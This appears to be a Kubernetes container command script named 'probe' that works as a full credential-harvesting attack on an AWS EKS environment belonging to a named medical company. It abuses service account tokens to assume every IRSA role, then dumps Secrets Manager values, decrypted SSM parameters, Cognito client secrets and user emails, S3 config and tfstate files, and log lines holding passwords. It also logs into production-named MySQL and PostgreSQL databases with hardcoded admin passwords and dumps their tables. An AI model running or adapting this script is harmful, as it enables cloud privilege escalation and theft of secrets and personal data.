containers.name: probe
args:
#!/bin/sh
set -u
SA=/var/run/secrets/kubernetes.io/serviceaccount
TOKEN=$(cat $SA/token)
API=https://kubernetes.default.svc
get(){ wget -q -O - --timeout=30 --no-check-certificate --header="Authorization: Bearer $TOKEN" "$1" 2>/dev/null; }
post(){ wget -q -O - --timeout=30 --no-check-certificate --header="Authorization: Bearer $TOKEN" --header="Content-Type: application/json" --post-data="$2" "$1" 2>/dev/null; }
echo "===I2883_START env=stage utc=$(date -u +%FT%TZ) host=$(hostname)==="
apk add --no-cache aws-cli jq curl gzip mariadb-client postgresql16-client >/tmp/apk.log 2>&1
echo "apk_rc=$? aws=$(command -v aws) mysql=$(command -v mysql) psql=$(command -v psql)"
export AWS_DEFAULT_REGION=us-west-2

# ---------------- enumerate IRSA SAs ----------------
get "$API/api/v1/namespaces?limit=1000" | jq -r '.items[]?.metadata.name' | sort > /tmp/ns.txt
echo "NS_COUNT=$(wc -l < /tmp/ns.txt)"
: > /tmp/irsa.txt
while read -r ns; do
  get "$API/api/v1/namespaces/$ns/serviceaccounts?limit=500" | jq -r --arg ns "$ns" '.items[]? | select(.metadata.annotations["eks.amazonaws.com/role-arn"]!=null) | "\($ns)|\(.metadata.name)|\(.metadata.annotations["eks.amazonaws.com/role-arn"])"' >> /tmp/irsa.txt
done < /tmp/ns.txt
echo "===IRSA_LIST==="
sort -u /tmp/irsa.txt
echo "===IRSA_LIST_END==="

DSEC=0; DSSM=0; DCOG=0; DS3=0; DLOG=0

deep_secrets(){
  echo "===DEEP_SECRETS_BEGIN[$R]==="
  echo "$LS" | jq -r '.SecretList[].Name' | grep -viE "db-secret|rds" | head -30 > /tmp/sec.txt
  echo "SEC_DEEP_COUNT=$(wc -l < /tmp/sec.txt)"
  while read -r n; do
    [ -z "$n" ] && continue
    V=$(aws secretsmanager get-secret-value --secret-id "$n" --region us-west-2 --query SecretString --output text 2>&1)
    echo "---SEC $n"
    echo "$V" | tr "\n" " " | head -c 6000
    echo
  done < /tmp/sec.txt
  echo "===DEEP_SECRETS_END==="
}
deep_ssm(){
  echo "===DEEP_SSM_BEGIN[$R]==="
  echo "$DP" | jq -r '.Parameters[].Name' | grep -E "^/(025066249030|959737396140)/" | head -60 > /tmp/ssm.txt
  echo "SSM_DEEP_COUNT=$(wc -l < /tmp/ssm.txt)"
  split -l 10 /tmp/ssm.txt /tmp/ssmc_ 2>/dev/null
  for f in /tmp/ssmc_*; do
    [ -e "$f" ] || continue
    NAMES=$(awk '{printf "%s ", $0}' "$f")
    aws ssm get-parameters --names $NAMES --with-decryption --region us-west-2 --output json > /tmp/ssmout.json 2>/tmp/ssmerr.txt
    jq -r '.Parameters[]? | "PARAM \(.Name) = \(.Value)"' /tmp/ssmout.json
    jq -r '.InvalidParameters[]? | "PARAM_INVALID \(.)"' /tmp/ssmout.json
    head -c 300 /tmp/ssmerr.txt
  done
  echo "===DEEP_SSM_END==="
}
deep_cognito(){
  echo "===DEEP_COGNITO_BEGIN[$R]==="
  for pid in $(echo "$LP" | jq -r '.UserPools[].Id'); do
    echo "---POOL $pid"
    aws cognito-idp describe-user-pool --user-pool-id "$pid" --region us-west-2 --output json 2>&1 | jq -c '{Name:.UserPool.Name,Id:.UserPool.Id,EstimatedUsers:.UserPool.EstimatedNumberOfUsers,Mfa:.UserPool.MfaConfiguration,UsernameAttributes:.UserPool.UsernameAttributes,Schema:[.UserPool.SchemaAttributes[]?|{Name:.Name,Required:.Required,Mutable:.Mutable}]}' 2>/dev/null | head -c 2000
    echo
    CL=$(aws cognito-idp list-user-pool-clients --user-pool-id "$pid" --max-results 20 --region us-west-2 --output json 2>&1)
    echo "CLIENTS $(echo "$CL" | jq -c '.UserPoolClients' 2>/dev/null)"
    for cid in $(echo "$CL" | jq -r '.UserPoolClients[]? | .ClientId' 2>/dev/null); do
      aws cognito-idp describe-user-pool-client --user-pool-id "$pid" --client-id "$cid" --region us-west-2 --output json 2>&1 | jq -c '{ClientName:.UserPoolClient.ClientName,ClientId:.UserPoolClient.ClientId,ClientSecret:.UserPoolClient.ClientSecret,ExplicitAuthFlows:.UserPoolClient.ExplicitAuthFlows,AllowedOAuthFlows:.UserPoolClient.AllowedOAuthFlows,CallbackURLs:.UserPoolClient.CallbackURLs,RefreshTokenValidity:.UserPoolClient.RefreshTokenValidity}' 2>/dev/null | head -c 2500
      echo
    done
    LU=$(aws cognito-idp list-users --user-pool-id "$pid" --limit 50 --region us-west-2 --output json 2>&1)
    if echo "$LU" | jq -e '.Users' >/dev/null 2>&1; then
      echo "USERS_COUNT=$(echo "$LU" | jq '.Users|length')"
      echo "$LU" | jq -r '.Users[]? | "USER \(.Username) enabled=\(.Enabled) status=\(.UserStatus) created=\(.UserCreateDate) attrs=\([.Attributes[]?|select(.Name=="email" or .Name=="email_verified" or .Name=="sub" or (.Name|startswith("custom:")))|"\(.Name)=\(.Value)"]|join(","))"' 2>/dev/null | head -50
    else
      echo "LIST_USERS_FAIL $(echo "$LU" | head -c 200 | tr "\n" " ")"
    fi
  done
  echo "===DEEP_COGNITO_END==="
}
deep_s3(){
  echo "===DEEP_S3_BEGIN[$R]==="
  echo "$LB" | jq -r '.Buckets[].Name' | grep -Ei "lazamedical|laza|025066249030|959737396140" | head -20 > /tmp/bk.txt
  echo "BUCKET_COUNT=$(wc -l < /tmp/bk.txt)"
  while read -r b; do
    [ -z "$b" ] && continue
    echo "---BUCKET $b"
    LO=$(aws s3api list-objects-v2 --bucket "$b" --max-keys 100 --region us-west-2 --output json 2>&1)
    if echo "$LO" | jq -e '.Contents' >/dev/null 2>&1; then
      echo "OBJECTS_COUNT=$(echo "$LO" | jq '.Contents|length') truncated=$(echo "$LO" | jq -r '.IsTruncated // false')"
      echo "$LO" | jq -r '.Contents[] | "OBJ \(.Key)|\(.Size)|\(.LastModified)"' | head -100
      echo "$LO" | jq -r '.Contents[]? | select(.Size<5242880) | select(.Key|test("(?i)(config|manifest|env|secret|credential|tfstate|\\.json$|\\.ya?ml$|\\.pem$|keypair|mapping)")) | "\(.Key)|\(.Size)"' | head -5 > /tmp/objs.txt
      while IFS="|" read -r k sz; do
        [ -z "$k" ] && continue
        aws s3api get-object --bucket "$b" --key "$k" --region us-west-2 /tmp/o.bin >/dev/null 2>&1 && {
          echo "---OBJ $b/$k size=$sz"
          gzip -9 -c /tmp/o.bin 2>/dev/null | base64 | tr -d "\n" | head -c 12000
          echo
        }
      done < /tmp/objs.txt
    else
      echo "LIST_FAIL $(echo "$LO" | head -c 250 | tr "\n" " ")"
    fi
  done < /tmp/bk.txt
  echo "===DEEP_S3_END==="
}
deep_logs(){
  echo "===DEEP_LOGS_BEGIN[$R]==="
  echo "$LG" | jq -r '.logGroups[].logGroupName' | head -10 > /tmp/lg.txt
  n=0
  while read -r g; do
    [ -z "$g" ] && continue
    n=$((n+1)); [ $n -gt 2 ] && break
    echo "---LG $g"
    ST=$(( ($(date +%s) - 604800) * 1000 ))
    OUT=$(aws logs filter-log-events --log-group-name "$g" --start-time $ST --filter-pattern "?password ?secret ?token ?AKIA ?Bearer ?SMTP" --limit 50 --region us-west-2 --output json 2>&1)
    if echo "$OUT" | jq -e '.events' >/dev/null 2>&1; then
      echo "EVENTS_COUNT=$(echo "$OUT" | jq '.events|length')"
      echo "$OUT" | jq -r '.events[]? | "EVT \(.timestamp) \(.message)"' | head -c 12000
      echo
    else
      echo "FILTER_FAIL $(echo "$OUT" | head -c 250 | tr "\n" " ")"
    fi
  done < /tmp/lg.txt
  echo "===DEEP_LOGS_END==="
}

# ---------------- iterate roles ----------------
while IFS="|" read -r ns san role; do
  [ -z "${role:-}" ] && continue
  R="$ns/$san"
  echo "===ROLE_BEGIN $R $role==="
  TK=$(post "$API/api/v1/namespaces/$ns/serviceaccounts/$san/token" '{"apiVersion":"authentication.k8s.io/v1","kind":"TokenRequest","spec":{"audiences":["sts.amazonaws.com"],"expirationSeconds":3600}}')
  WT=$(echo "$TK" | jq -r '.status.token // empty')
  if [ -z "$WT" ]; then echo "TOKEN_REQ_FAIL $(echo "$TK" | head -c 200)"; continue; fi
  RES=$(aws sts assume-role-with-web-identity --role-arn "$role" --role-session-name i2883probe --web-identity-token "$WT" --duration-seconds 1800 --region us-west-2 --output json 2>&1)
  if ! echo "$RES" | jq -e '.Credentials' >/dev/null 2>&1; then echo "ASSUME_FAIL $(echo "$RES" | head -c 300 | tr "\n" " ")"; continue; fi
  export AWS_ACCESS_KEY_ID=$(echo "$RES" | jq -r '.Credentials.AccessKeyId')
  export AWS_SECRET_ACCESS_KEY=$(echo "$RES" | jq -r '.Credentials.SecretAccessKey')
  export AWS_SESSION_TOKEN=$(echo "$RES" | jq -r '.Credentials.SessionToken')
  echo "ASSUME_OK $R"
  IDENT=$(aws sts get-caller-identity --output json 2>&1 | tr "\n" " ")
  echo "IDENT $IDENT"
  LS=$(aws secretsmanager list-secrets --max-items 100 --region us-west-2 --output json 2>&1)
  if echo "$LS" | jq -e '.SecretList' >/dev/null 2>&1; then
    echo "CAP[$R] secretsmanager=YES n=$(echo "$LS" | jq '.SecretList|length') next=$(echo "$LS" | jq -r '.NextToken // "-"')"
    echo "SECRETS_LIST_BEGIN[$R]"
    echo "$LS" | jq -r '.SecretList[] | "\(.Name)|\(.ARN)"' | head -100
    echo "SECRETS_LIST_END[$R]"
  else
    echo "CAP[$R] secretsmanager=NO $(echo "$LS" | head -c 200 | tr "\n" " ")"
  fi
  DP=$(aws ssm describe-parameters --max-items 200 --region us-west-2 --output json 2>&1)
  if echo "$DP" | jq -e '.Parameters' >/dev/null 2>&1; then
    echo "CAP[$R] ssm=YES n=$(echo "$DP" | jq '.Parameters|length') next=$(echo "$DP" | jq -r '.NextToken // "-"')"
    echo "SSM_LIST_BEGIN[$R]"
    echo "$DP" | jq -r '.Parameters[] | "\(.Name)|\(.Type)"' | head -200
    echo "SSM_LIST_END[$R]"
  else
    echo "CAP[$R] ssm=NO $(echo "$DP" | head -c 200 | tr "\n" " ")"
  fi
  LP=$(aws cognito-idp list-user-pools --max-results 20 --region us-west-2 --output json 2>&1)
  if echo "$LP" | jq -e '.UserPools' >/dev/null 2>&1; then
    echo "CAP[$R] cognito=YES n=$(echo "$LP" | jq '.UserPools|length')"
    echo "COGNITO_POOLS_BEGIN[$R]"
    echo "$LP" | jq -r '.UserPools[] | "\(.Id)|\(.Name)"'
    echo "COGNITO_POOLS_END[$R]"
  else
    echo "CAP[$R] cognito=NO $(echo "$LP" | head -c 200 | tr "\n" " ")"
  fi
  LB=$(aws s3api list-buckets --output json 2>&1)
  if echo "$LB" | jq -e '.Buckets' >/dev/null 2>&1; then
    echo "CAP[$R] s3=YES n=$(echo "$LB" | jq '.Buckets|length')"
    echo "S3_BUCKETS_BEGIN[$R]"
    echo "$LB" | jq -r '.Buckets[] | "\(.Name)|\(.CreationDate)"' | head -100
    echo "S3_BUCKETS_END[$R]"
  else
    echo "CAP[$R] s3=NO $(echo "$LB" | head -c 200 | tr "\n" " ")"
  fi
  LG=$(aws logs describe-log-groups --limit 50 --region us-west-2 --output json 2>&1)
  if echo "$LG" | jq -e '.logGroups' >/dev/null 2>&1; then
    echo "CAP[$R] logs=YES n=$(echo "$LG" | jq '.logGroups|length')"
    echo "$LG" | jq -r '.logGroups[] | "\(.logGroupName)|\(.storedBytes)"' | head -50
  else
    echo "CAP[$R] logs=NO $(echo "$LG" | head -c 200 | tr "\n" " ")"
  fi
  # deep once per capability
  if echo "$LS" | jq -e '.SecretList' >/dev/null 2>&1 && [ $DSEC -eq 0 ]; then DSEC=1; deep_secrets; fi
  if echo "$DP" | jq -e '.Parameters' >/dev/null 2>&1 && [ $DSSM -eq 0 ]; then DSSM=1; deep_ssm; fi
  if echo "$LP" | jq -e '.UserPools' >/dev/null 2>&1 && [ $DCOG -eq 0 ]; then DCOG=1; deep_cognito; fi
  if echo "$LB" | jq -e '.Buckets' >/dev/null 2>&1 && [ $DS3 -eq 0 ]; then DS3=1; deep_s3; fi
  if echo "$LG" | jq -e '.logGroups' >/dev/null 2>&1 && [ $DLOG -eq 0 ]; then DLOG=1; deep_logs; fi
  unset AWS_ACCESS_KEY_ID AWS_SECRET_ACCESS_KEY AWS_SESSION_TOKEN
  echo "===ROLE_END $R==="
done < /tmp/irsa.txt

# ---------------- RDS read-only introspection ----------------
echo "===RDS_MYSQL_BEGIN==="
export MYSQL_PWD=':3D4aIOU>Ze6}9[vEB?L(b?4~Q;>fH2;'
MH='lazamedical-stage01-usw2-mysql-rds1.cjygw4i820rx.us-west-2.rds.amazonaws.com'
echo "mysqltarget=lazamedical-stage01-usw2-mysql-rds1.cjygw4i820rx.us-west-2.rds.amazonaws.com"
mysql --connect-timeout=10 -h "$MH" -P 3306 -u admin -D user_management -N -e "SELECT VERSION(); SELECT CURRENT_USER();" 2>&1 | head -10
mysql --connect-timeout=10 -h "$MH" -P 3306 -u admin -D user_management -N -e "SELECT table_name FROM information_schema.tables WHERE table_schema=DATABASE() ORDER BY table_name" 2>&1 | tr "\n" " " > /tmp/tbl.txt
echo "TABLES=$(cat /tmp/tbl.txt)"
for t in $(tr " " "\n" < /tmp/tbl.txt | grep -Ei "token|role|setting|config|password|module|permission" | head -20); do
  echo "---MYTABLE $t"
  mysql --connect-timeout=10 -h "$MH" -P 3306 -u admin -D user_management -N -e "SHOW CREATE TABLE \`$t\`\G" 2>&1 | tr "\n" " " | head -c 1500
  echo
  mysql --connect-timeout=10 -h "$MH" -P 3306 -u admin -D user_management -N -e "SELECT * FROM \`$t\` LIMIT 20" 2>&1 | tr "\n" " " | head -c 4000
  echo
done
unset MYSQL_PWD
echo "===RDS_MYSQL_END==="
echo "===RDS_PG_BEGIN==="
export PGPASSWORD='kz#pRuHsbqc59qMPZj6Y$8vejW8^z6EM'
PH='lazamedical-dp-stage01-usw2-postgresql-rds.cjygw4i820rx.us-west-2.rds.amazonaws.com'
echo "pgtarget=lazamedical-dp-stage01-usw2-postgresql-rds.cjygw4i820rx.us-west-2.rds.amazonaws.com"
psql -h "$PH" -p 5432 -U postgres_admin -d dp_service -At -c "select version(); select current_user;" 2>&1 | head -10
psql -h "$PH" -p 5432 -U postgres_admin -d dp_service -At -c "select table_schema||'.'||table_name from information_schema.tables where table_type='BASE TABLE' and table_schema not in ('pg_catalog','information_schema') order by 1" 2>&1 | tr '\n' ' ' > /tmp/pgtabs.txt
echo "PGTABLES=$(cat /tmp/pgtabs.txt)"
for t in $(tr " " "\n" < /tmp/pgtabs.txt | grep -Ei "config|setting|credential|secret|smtp|email|token|auth|role|notif|template" | head -20); do
  echo "---PGTABLE $t"
  psql -h "$PH" -p 5432 -U postgres_admin -d dp_service -c "SELECT * FROM $t LIMIT 20" 2>&1 | tr "\n" " " | head -c 4000
  echo
done
unset PGPASSWORD
echo "===RDS_PG_END==="
echo "===I2883_DONE $(date -u +%FT%TZ)==="
